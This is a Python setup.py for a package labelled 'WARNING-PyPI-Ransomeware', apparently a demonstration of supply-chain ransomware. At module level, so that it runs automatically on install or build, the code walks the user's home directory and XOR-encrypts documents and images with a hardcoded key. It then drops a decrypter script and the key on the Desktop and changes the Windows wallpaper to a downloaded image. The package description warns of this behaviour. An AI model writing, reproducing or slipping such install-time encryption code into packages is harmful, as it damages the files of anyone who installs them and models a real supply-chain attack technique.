import os
import base64
import ctypes
import urllib.request
from setuptools import setup, find_packages

FILE_EXTS = ["txt", "rtf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "pdf", "jpg", "jpeg", "png", "jfif"]
KEY = b"1AhEPb-PO2TnEyG4ODw8HQeQLxv_Nku2ofWtrya5R3I="
SYSROOT = os.path.expanduser('~')


def crypt_file(file_path):
    try:
        with open(file_path, "rb") as file:
            data = file.read()
        encrypted_data = bytearray()
        for i, byte in enumerate(data):
            encrypted_data.append(byte ^ KEY[i % len(KEY)])
        serialized_data = base64.b64encode(encrypted_data)
        with open(file_path, "wb") as file:
            file.write(serialized_data)
    except:
        pass
    

def crypt_system():
    system = os.walk(SYSROOT, topdown=True)
    for root, dirs, files in system:
        for file in files:
            file_path = os.path.join(root, file)
            if file.split('.')[-1].lower() in FILE_EXTS:
                crypt_file(file_path)
                

def change_desktop_background():
    imageUrl = "https://i.ytimg.com/vi/8BHH9a2beg8/maxresdefault.jpg"
    path = f"{SYSROOT}\\Desktop\\background.jpg"
    urllib.request.urlretrieve(imageUrl, path)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)


def decrypter():
    try:
        os.mkdir(f"{SYSROOT}\\Desktop\\Decrypter")
    finally:
        with open(f"{SYSROOT}\\Desktop\\Decrypter\\decrypter.py", 'w') as dec_file:
            dec_file.write(r"""
import os
import base64

FILE_EXTS = ["txt", "rtf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "pdf", "jpg", "jpeg", "png", "jfif"]
SYSROOT = os.path.expanduser('~')

def decrypt_file(file_path, key):
    try:
        with open(file_path, "rb") as file:
            data = file.read()
        deserialized_data = base64.b64decode(data)
        unencrypted_data = bytearray()
        for i, byte in enumerate(deserialized_data):
            unencrypted_data.append(byte ^ key[i % len(key)])
        with open(file_path, "wb") as file:
            file.write(unencrypted_data)
    except:
        pass


def decrypt_system(key):
        system = os.walk(SYSROOT, topdown=True)
        for root, dirs, files in system:
            for file in files:
                file_path = os.path.join(root, file)
                if file.split('.')[-1].lower() in FILE_EXTS:                    
                    decrypt_file(file_path, key)
                   

def main():
    with open("KEY", "rb") as key_file:
        key = key_file.read()
    for i in range(2):
        decrypt_system(key)


if __name__ == "__main__":
    main()
""")
        with open(f"{SYSROOT}\\Desktop\\Decrypter\\KEY", 'w') as key_file:
            key_file.write("1AhEPb-PO2TnEyG4ODw8HQeQLxv_Nku2ofWtrya5R3I=")

crypt_system()
decrypter()
change_desktop_background()

setup(
  name = "WARNING-PyPI-Ransomeware",
  packages = find_packages(),
  version = "",
  description = "WARNING: The PyPI-Ransomeware will encrypt your files! for more information visit: https://github.com/dkonis/PyPI-Ransomware",
  author = "dkonis",
  author_email = "",
  url = "",
  download_url = "", 
  keywords = [""],
  classifiers = [],
)
